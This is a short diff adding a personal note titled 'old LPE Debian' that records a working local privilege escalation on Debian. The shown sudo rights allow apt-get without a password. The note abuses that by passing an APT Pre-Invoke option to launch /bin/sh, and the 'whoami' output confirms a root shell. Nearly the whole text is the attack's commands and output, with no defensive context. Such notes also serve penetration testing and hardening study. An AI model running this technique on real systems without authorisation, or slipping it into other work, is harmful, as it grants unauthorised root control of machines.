@@ -1,0 +1,9 @@
+old LPE Debian
+
+sudo -l
+NOPASSWD: /usr/bin/apt-get
+
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+whoami
+root#
